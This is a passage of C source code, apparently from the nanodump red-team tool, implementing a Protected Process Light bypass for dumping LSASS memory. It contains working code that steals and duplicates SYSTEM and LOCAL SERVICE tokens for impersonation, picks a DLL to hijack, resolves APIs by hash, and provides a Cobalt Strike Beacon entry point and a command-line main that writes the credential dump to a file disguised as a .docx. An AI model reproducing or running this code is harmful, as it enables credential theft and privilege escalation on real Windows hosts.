    *phSection = hSection;
    bReturnValue = TRUE;

end:
    if (hDllTransacted)
        NtClose(hDllTransacted);

    return bReturnValue;
}

BOOL check_ppl_requirements(VOID)
{
    HANDLE hToken = NULL;
    LPCWSTR ppwszRequiredPrivileges[2] = {
        L"SeDebugPrivilege",
        L"SeImpersonatePrivilege"
    };
    NTSTATUS status;
    BOOL success;

    // get a handle to our token
    status = NtOpenProcessToken(
        NtCurrentProcess(),
        TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
        &hToken);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtOpenProcessToken", status);
        return FALSE;
    }

    for (int i = 0; i < ARRAY_SIZE(ppwszRequiredPrivileges); i++)
    {
        // make sure we have all the privileges we need
        success = check_token_privilege(hToken, ppwszRequiredPrivileges[i], TRUE);
        if (!success)
        {
            NtClose(hToken); hToken = NULL;
            PRINT_ERR("A privilege is missing: %ls", ppwszRequiredPrivileges[i]);
            return FALSE;
        }
    }

    NtClose(hToken); hToken = NULL;

    // Check windows version >= 8.1
    if (!is_win_8_point_1_or_grater())
    {
        DPRINT_ERR("The Windows version must be 8.1 or greater");
        return FALSE;
    }

    return TRUE;
}

BOOL get_hijackeable_dllname(
    OUT LPWSTR* ppwszDllName)
{
    if (!ppwszDllName)
        return FALSE;

    *ppwszDllName = intAlloc(64 * sizeof(WCHAR));
    if (!*ppwszDllName)
    {
        malloc_failed()
        return FALSE;
    }

    if (is_win_10_or_grater())
    {
        wcsncpy(*ppwszDllName, DLL_TO_HIJACK_WIN10, 64);
        return TRUE;
    }

    if (is_win_8_point_1_or_grater())
    {
        wcsncpy(*ppwszDllName, DLL_TO_HIJACK_WIN81, 64);
        return TRUE;
    }

    DPRINT_ERR("Invalid Windows version");

    intFree(*ppwszDllName); *ppwszDllName = NULL;

    return FALSE;
}

BOOL impersonate_user(
    IN LPCWSTR pwszSid,
    IN PHANDLE phToken,
    IN LPCWSTR pwszPrivileges[],
    IN DWORD dwPrivilegeCount)
{
    BOOL bReturnValue = FALSE;

    HANDLE hCurrentProcessToken = NULL;
    *phToken = NULL;
    HANDLE hToken = NULL;
    NTSTATUS status;
    BOOL success;

    status = NtOpenProcessToken(
        NtCurrentProcess(),
        MAXIMUM_ALLOWED,
        &hCurrentProcessToken);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtOpenProcessToken", status);
        goto end;
    }

    success = check_token_privilege(
        hCurrentProcessToken,
        L"SeDebugPrivilege",
        TRUE);
    if (!success)
        goto end;

    success = check_token_privilege(
        hCurrentProcessToken,
        L"SeImpersonatePrivilege",
        TRUE);
    if (!success)
        goto end;

    success = find_process_token_and_duplicate(
        pwszSid,
        pwszPrivileges,
        dwPrivilegeCount,
        &hToken);
    if (!success)
        goto end;

    success = impersonate(hToken);
    if (!success)
        goto end;

    *phToken = hToken;
    bReturnValue = TRUE;

end:
    if (hCurrentProcessToken)
        NtClose(hCurrentProcessToken);
    if (!bReturnValue && hToken)
        NtClose(hToken);

    return bReturnValue;
}

BOOL impersonate(
    IN HANDLE hToken)
{
    NTSTATUS status;

    status = NtSetInformationThread(
        NtCurrentThread(),
        ThreadImpersonationToken,
        &hToken,
        sizeof(HANDLE));
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtSetInformationThread", status);
        return FALSE;
    }

    return TRUE;
}

BOOL find_process_token_and_duplicate(
    IN LPCWSTR pwszTargetSid,
    IN LPCWSTR pwszPrivileges[],
    IN DWORD dwPrivilegeCount,
    OUT PHANDLE phToken)
{
    BOOL bReturnValue = FALSE;

    PSID pTargetSid = NULL;
    PVOID pBuffer = NULL;
    PSYSTEM_PROCESS_INFORMATION pProcInfo = NULL;
    HANDLE hProcess = NULL, hToken = NULL, hTokenDup = NULL;
    DWORD dwBufSize = 0x1000;
    PSID pSidTmp = NULL;
    LPWSTR pwszUsername = NULL;
    NTSTATUS status;
    ConvertStringSidToSidW_t ConvertStringSidToSidW;
    CLIENT_ID uPid = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes;
    OBJECT_ATTRIBUTES TokenObjectAttributes;
    SECURITY_QUALITY_OF_SERVICE Qos;
    BOOL success;

    ConvertStringSidToSidW = (ConvertStringSidToSidW_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        ConvertStringSidToSidW_SW2_HASH,
        0);
    if (!ConvertStringSidToSidW)
    {
        DPRINT_ERR("Address of 'ConvertStringSidToSidW' not found");
        goto end;
    }

    success = ConvertStringSidToSidW(pwszTargetSid, &pTargetSid);
    if (!success)
    {
        function_failed("ConvertStringSidToSidW");
        goto end;
    }

    // get information of all currently running processes
    do
    {
        pBuffer = intAlloc(dwBufSize);
        if (!pBuffer)
        {
            malloc_failed();
            goto end;
        }

        status = NtQuerySystemInformation(
            SystemProcessInformation,
            pBuffer,
            dwBufSize,
            &dwBufSize);

        if (NT_SUCCESS(status))
            break;

        intFree(pBuffer); pBuffer = NULL;
    } while (status == STATUS_BUFFER_TOO_SMALL || status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtQuerySystemInformation", status);
        goto end;
    }

    pProcInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;

    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    InitializeObjectAttributes(&TokenObjectAttributes, NULL, 0, NULL, NULL);
    Qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
    Qos.ImpersonationLevel = SecurityImpersonation;
    Qos.ContextTrackingMode = 0;
    Qos.EffectiveOnly = FALSE;
    TokenObjectAttributes.SecurityQualityOfService = &Qos;

    while (TRUE)
    {
        uPid.UniqueProcess = pProcInfo->UniqueProcessId;

        status = NtOpenProcess(
            &hProcess,
            PROCESS_QUERY_INFORMATION,
            &ObjectAttributes,
            &uPid);
        if (NT_SUCCESS(status))
        {
            // open a handle to the token of the process
            status = NtOpenProcessToken(
                hProcess,
                TOKEN_QUERY | TOKEN_DUPLICATE,
                &hToken);

            if (NT_SUCCESS(status))
            {
                status = NtDuplicateToken(
                    hToken,
                    MAXIMUM_ALLOWED,
                    &TokenObjectAttributes,
                    FALSE,
                    TokenImpersonation,
                    &hTokenDup);

                if (NT_SUCCESS(status))
                {
                    success = token_get_sid(hTokenDup, &pSidTmp);
                    if (success)
                    {
                        success = token_get_username(hTokenDup, &pwszUsername);
                        if (success)
                        {
                            success = token_compare_sids(pSidTmp, pTargetSid);
                            if (success)
                            {
                                DPRINT("Found a potential Process candidate: PID=%d - Image='%ls' - User='%ls'", (USHORT)(ULONG_PTR)pProcInfo->UniqueProcessId, pProcInfo->ImageName.Buffer, pwszUsername);

                                BOOL bTokenIsNotRestricted = FALSE;
                                success = token_is_not_restricted(hTokenDup, &bTokenIsNotRestricted);
                                if (success)
                                {
                                    if (!bTokenIsNotRestricted)
                                    {
                                        DPRINT("This token is restricted.");
                                    }
                                    else
                                    {
                                        DPRINT("This token is not restricted.");

                                        if (pwszPrivileges && dwPrivilegeCount != 0)
                                        {
                                            DWORD dwPrivilegeFound = 0;
                                            for (DWORD i = 0; i < dwPrivilegeCount; i++)
                                            {
                                                if (check_token_privilege(hTokenDup, pwszPrivileges[i], FALSE))
                                                    dwPrivilegeFound++;
                                            }

                                            if (dwPrivilegeFound == dwPrivilegeCount)
                                            {
                                                DPRINT("Found a valid Token.");
                                                *phToken = hTokenDup;
                                                bReturnValue = TRUE;
                                            }
                                        }
                                        else
                                        {
                                            DPRINT("Found a valid Token.");
                                            *phToken = hTokenDup;
                                            bReturnValue = TRUE;
                                        }
                                        DPRINT("The token was not valid.");
                                    }
                                }
                            }
                            intFree(pwszUsername); pwszUsername = NULL;
                        }
                        LocalFree(pSidTmp); pSidTmp = NULL;
                    }
                    if (!bReturnValue)
                    {
                        NtClose(hTokenDup); hTokenDup = NULL;
                    }
                }
                NtClose(hToken); hToken = NULL;
            }
            NtClose(hProcess); hProcess = NULL;
        }
        // If we found a valid token, stop
        if (bReturnValue)
            break;

        // If next entry is null, stop
        if (!pProcInfo->NextEntryOffset)
            break;

        // Increment SYSTEM_PROCESS_INFORMATION pointer
        pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
    }

    if (!bReturnValue)
    {
        PRINT_ERR("No valid process token to impersonate was found.");
    }

end:
    if (pTargetSid)
        LocalFree(pTargetSid);
    if (pBuffer)
        intFree(pBuffer);

    return bReturnValue;
}

BOOL impersonate_system(
    OUT PHANDLE phSystemToken)
{
    BOOL success;
    LPCWSTR pwszPrivileges[2] = {
        L"SeDebugPrivilege",
        L"SeAssignPrimaryTokenPrivilege"
    };

    success = impersonate_user(
        L"S-1-5-18",
        phSystemToken,
        pwszPrivileges,
        ARRAY_SIZE(pwszPrivileges));

    if (!success)
    {
        PRINT_ERR("Could not impersonate SYSTEM");
    }

    return success;
}

BOOL impersonate_local_service(
    OUT PHANDLE phLocalServiceToken)
{
    BOOL success;
    
    success = impersonate_user(
        L"S-1-5-19",
        phLocalServiceToken,
        NULL,
        0);

    if (!success)
    {
        PRINT_ERR("Could not impersonate LOCAL SERVICE");
    }

    return success;
}

#ifdef BOF

void go(char* args, int length)
{
    datap  parser;
    BOOL   fork_lsass                = FALSE;
    BOOL   snapshot_lsass            = FALSE;
    BOOL   duplicate_handle          = FALSE;
    LPCSTR dump_path                 = NULL;
    BOOL   use_valid_sig             = FALSE;
    BOOL   use_malseclogon           = FALSE;
    LPCSTR malseclogon_target_binary = NULL;
    unsigned char* nanodump_ppl_dll     = NULL;
    int            nanodump_ppl_dll_len = 0;

    BeaconDataParse(&parser, args, length);
    dump_path = BeaconDataExtract(&parser, NULL);
    use_valid_sig = (BOOL)BeaconDataInt(&parser);
    fork_lsass = (BOOL)BeaconDataInt(&parser);
    snapshot_lsass = (BOOL)BeaconDataInt(&parser);
    duplicate_handle = (BOOL)BeaconDataInt(&parser);
    use_malseclogon = (BOOL)BeaconDataInt(&parser);
    malseclogon_target_binary = BeaconDataExtract(&parser, NULL);
    nanodump_ppl_dll = (unsigned char*)BeaconDataExtract(&parser, &nanodump_ppl_dll_len);

    run_ppl_bypass_exploit(
        nanodump_ppl_dll,
        nanodump_ppl_dll_len,
        dump_path,
        use_valid_sig,
        fork_lsass,
        snapshot_lsass,
        duplicate_handle,
        use_malseclogon,
        malseclogon_target_binary);
}

#endif

#ifdef EXE

void usage(char* procname)
{
    PRINT("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--dup] [--help]", procname);
    PRINT("    --write DUMP_PATH, -w DUMP_PATH");
    PRINT("            filename of the dump");
    PRINT("    --valid, -v");
    PRINT("            create a dump with a valid signature");
    PRINT("    --dup, -d");
    PRINT("            duplicate an existing " LSASS " handle");
    PRINT("    --help, -h");
    PRINT("            print this help message and leave");
}

int main(int argc, char* argv[])
{
    BOOL   fork_lsass                = FALSE;
    BOOL   snapshot_lsass            = FALSE;
    BOOL   duplicate_handle          = FALSE;
    LPCSTR dump_path                 = NULL;
    BOOL   use_valid_sig             = FALSE;
    BOOL   use_malseclogon           = FALSE;
    LPCSTR malseclogon_target_binary = NULL;

#ifdef _M_IX86
    if(local_is_wow64())
    {
        PRINT_ERR("Nanodump does not support WoW64");
        return -1;
    }
#endif

    for (int i = 1; i < argc; ++i)
    {
        if (!strncmp(argv[i], "-v", 3) ||
            !strncmp(argv[i], "--valid", 8))
        {
            use_valid_sig = TRUE;
        }
        else if (!strncmp(argv[i], "-w", 3) ||
                 !strncmp(argv[i], "--write", 8))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --write value");
                return -1;
            }
            dump_path = argv[++i];
        }
        else if (!strncmp(argv[i], "-f", 3) ||
                 !strncmp(argv[i], "--fork", 7))
        {
            // TODO: make this work
            PRINT("The parameter --fork is not allowed.");
            return 0;
            //fork_lsass = TRUE;
        }
        else if (!strncmp(argv[i], "-s", 3) ||
                 !strncmp(argv[i], "--snapshot", 11))
        {
            // TODO: make this work
            PRINT("The parameter --snapshot is not allowed.");
            return 0;
            //snapshot_lsass = TRUE;
        }
        else if (!strncmp(argv[i], "-d", 3) ||
                 !strncmp(argv[i], "--dup", 6))
        {
            duplicate_handle = TRUE;
        }
        else if (!strncmp(argv[i], "-m", 3) ||
                 !strncmp(argv[i], "--malseclogon", 14))
        {
            use_malseclogon = TRUE;
        }
        else if (!strncmp(argv[i], "-b", 3) ||
                 !strncmp(argv[i], "--binary", 8))
        {
            if (i + 1 >= argc)
            {
                PRINT("missing --binary value");
                return -1;
            }
            malseclogon_target_binary = argv[++i];
        }
        else if (!strncmp(argv[i], "-h", 3) ||
                 !strncmp(argv[i], "--help", 7))
        {
            usage(argv[0]);
            return 0;
        }
        else
        {
            PRINT("invalid argument: %s", argv[i]);
            return -1;
        }
    }

    if (!dump_path)
    {
        usage(argv[0]);
        return -1;
    }

    if (!is_full_path(dump_path))
    {
        PRINT("You need to provide the full path: %s", dump_path);
        return -1;
    }

    if (fork_lsass && snapshot_lsass)
    {
        PRINT("The options --fork and --snapshot cannot be used at the same time");
        return -1;
    }

    if (use_malseclogon && !duplicate_handle)
    {
        PRINT("In this mode, if MalSecLogon is being used, --dup must be provided.");
        return -1;
    }

    if (use_malseclogon && !malseclogon_target_binary)
    {
        PRINT("In this mode, if MalSecLogon is being used, --binary must be provided.");
        return -1;
    }

    if (malseclogon_target_binary &&
        !is_full_path(malseclogon_target_binary))
    {
        PRINT("You need to provide the full path: %s", malseclogon_target_binary);
        return -1;
    }

    if (malseclogon_target_binary &&
        !file_exists(malseclogon_target_binary))
    {
        PRINT("The binary \"%s\" does not exists.", malseclogon_target_binary);
        return -1;
    }

    run_ppl_bypass_exploit(
        nanodump_ppl_dll,
        nanodump_ppl_dll_len,
        dump_path,
        use_valid_sig,
        fork_lsass,
        snapshot_lsass,
        duplicate_handle,
        use_malseclogon,
        malseclogon_target_binary);

    return 0;
}

#endif
